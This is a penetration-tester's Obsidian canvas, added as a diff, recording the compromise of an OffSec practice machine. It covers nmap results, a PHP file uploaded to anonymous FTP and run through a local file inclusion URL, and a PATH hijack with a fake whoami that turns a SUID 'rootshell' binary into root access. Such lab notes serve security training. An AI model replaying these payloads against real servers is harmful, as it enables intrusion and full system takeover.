@@ -1,0 +1,41 @@
+{
+	"nodes":[
+		{"id":"6aad89b1c4767964","type":"group","x":0,"y":-260,"width":290,"height":260,"label":"TCP - open"},
+		{"id":"3a7280eef73acbd8","type":"text","text":"# TARGET","x":-200,"y":-155,"width":180,"height":50},
+		{"id":"ec760b55d80111c6","type":"text","text":"### nmap\n```\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:192.168.45.249\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 4\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_drwxrwxrwx    2 0        0            4096 Feb 08  2020 pub [NSE: writeable]\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)\n| ssh-hostkey: \n|   2048 06:1b:a3:92:83:a5:7a:15:bd:40:6e:0c:8d:98:27:7b (RSA)\n|   256 cb:38:83:26:1a:9f:d3:5d:d3:fe:9b:a1:d3:bc:ab:2c (ECDSA)\n|_  256 65:54:fc:2d:12:ac:e1:84:78:3e:00:23:fb:e4:c9:ee (ED25519)\n80/tcp open  http    Apache httpd 2.4.38 ((Debian))\n|_http-title: Apache2 Debian Default Page: It works\n| http-methods: \n|_  Supported Methods: GET POST OPTIONS HEAD\n|_http-server-header: Apache/2.4.38 (Debian)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n```","x":-820,"y":20,"width":748,"height":713},
+		{"id":"a140b8177f190d81","type":"text","text":"port 21","x":20,"y":-240,"width":250,"height":60},
+		{"id":"9cc0fa67301a7bd0","type":"text","text":"port 22","x":20,"y":-160,"width":250,"height":60},
+		{"id":"a8f29da4bea319df","type":"text","text":"port 80","x":20,"y":-80,"width":250,"height":60},
+		{"id":"7a23e5a21ec736d1","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260726195537.png","x":300,"y":80,"width":400,"height":61},
+		{"id":"68319bd69b80a52a","type":"text","text":"The message “**You are not a search engine! You can’t read my robots.txt!**” is a **custom error or denial message** the web server is sending to you. It means the website has implemented a simple defense mechanism to block or deny access to certain automated tools.","x":228,"y":360,"width":545,"height":140},
+		{"id":"ad53ec76d9cb3ff4","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260726195757.png","x":960,"y":300,"width":457,"height":231},
+		{"id":"2e89533f10c06fdf","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260726195848.png","x":989,"y":620,"width":400,"height":214},
+		{"id":"41c9132d2754aa6c","type":"text","text":"```\nI FOUND OUT IT WAS USING VERIABLE NAME lang?\n```","x":1061,"y":1008,"width":259,"height":112},
+		{"id":"0a546b682931ef58","type":"text","text":"```\ni uploaded my hell.php on ftp server\n```","x":1520,"y":1001,"width":250,"height":126},
+		{"id":"46f2a628c97ce891","type":"text","text":"```\nhttp://192.168.107.14/secret_information/?lang=/var/ftp/pub/hell.php\n```","x":1527,"y":1281,"width":413,"height":119},
+		{"id":"ac678df9cb489b1d","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260727161337.png","x":1534,"y":1580,"width":399,"height":94},
+		{"id":"0adf5c8b7f17646c","type":"text","text":"FOUND OUT ROOTSHELL.C WHICH IS ROOT POWERS ONLY BY CHECKING WHOAMI","x":1820,"y":1820,"width":302,"height":121,"color":"#f7a6a6"},
+		{"id":"5871305a47fb5828","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260727161526.png","x":1534,"y":2020,"width":400,"height":291},
+		{"id":"5f0a67d44fe41cf2","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260727161712.png","x":1480,"y":2520,"width":509,"height":197},
+		{"id":"9af85401e8e5133c","type":"text","text":"```\nwww-data@inclusiveness:/home/tom$ export PATH=\"/tmp:$PATH\"\nexport PATH=\"/tmp:$PATH\"\n\n```","x":1428,"y":2920,"width":613,"height":122},
+		{"id":"5aca5118d60824b7","type":"text","text":"```\nwww-data@inclusiveness:/home/tom$ ./rootshell\n./rootshell\nchecking if you are tom...\nyou are: tom\n\naccess granted.\n# whoami\nwhoami\ntom\n# sudo -l\nsudo -l\nMatching Defaults entries for root on inclusiveness:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser root may run the following commands on inclusiveness:\n    (ALL : ALL) ALL\n```","x":1345,"y":3140,"width":780,"height":480,"color":"#b1fcab"},
+		{"id":"fadae22703f517e9","type":"text","text":"# SHELL","x":1645,"y":3700,"width":180,"height":50}
+	],
+	"edges":[
+		{"id":"18ab0f13e760c9b0","fromNode":"3a7280eef73acbd8","fromSide":"bottom","toNode":"ec760b55d80111c6","toSide":"top"},
+		{"id":"df5f52a9e970c149","fromNode":"a8f29da4bea319df","fromSide":"right","toNode":"7a23e5a21ec736d1","toSide":"top"},
+		{"id":"763daf9041ddfe22","fromNode":"7a23e5a21ec736d1","fromSide":"bottom","toNode":"68319bd69b80a52a","toSide":"top"},
+		{"id":"1ad3558e07805788","fromNode":"68319bd69b80a52a","fromSide":"right","toNode":"ad53ec76d9cb3ff4","toSide":"left"},
+		{"id":"276955339bbfe7f6","fromNode":"ad53ec76d9cb3ff4","fromSide":"bottom","toNode":"2e89533f10c06fdf","toSide":"top"},
+		{"id":"8d32d960a24dd2e7","fromNode":"2e89533f10c06fdf","fromSide":"bottom","toNode":"41c9132d2754aa6c","toSide":"top"},
+		{"id":"7a0b3359f8960217","fromNode":"41c9132d2754aa6c","fromSide":"right","toNode":"0a546b682931ef58","toSide":"left"},
+		{"id":"00551abdf49b85a2","fromNode":"0a546b682931ef58","fromSide":"bottom","toNode":"46f2a628c97ce891","toSide":"top"},
+		{"id":"63ecc87a0a339eb1","fromNode":"46f2a628c97ce891","fromSide":"bottom","toNode":"ac678df9cb489b1d","toSide":"top"},
+		{"id":"10682a35d5383aaa","fromNode":"ac678df9cb489b1d","fromSide":"bottom","toNode":"5871305a47fb5828","toSide":"top"},
+		{"id":"475bc026b7292356","fromNode":"ac678df9cb489b1d","fromSide":"bottom","toNode":"0adf5c8b7f17646c","toSide":"top"},
+		{"id":"81b22aa6d4548bba","fromNode":"5871305a47fb5828","fromSide":"bottom","toNode":"5f0a67d44fe41cf2","toSide":"top","label":"made fake whoami"},
+		{"id":"1a03ce8d147b4079","fromNode":"5f0a67d44fe41cf2","fromSide":"bottom","toNode":"9af85401e8e5133c","toSide":"top","label":"CHANGE THE PATH"},
+		{"id":"85aef23445c48340","fromNode":"9af85401e8e5133c","fromSide":"bottom","toNode":"5aca5118d60824b7","toSide":"top"},
+		{"id":"eb86c18865b35abf","fromNode":"5aca5118d60824b7","fromSide":"bottom","toNode":"fadae22703f517e9","toSide":"top"}
+	]
+}
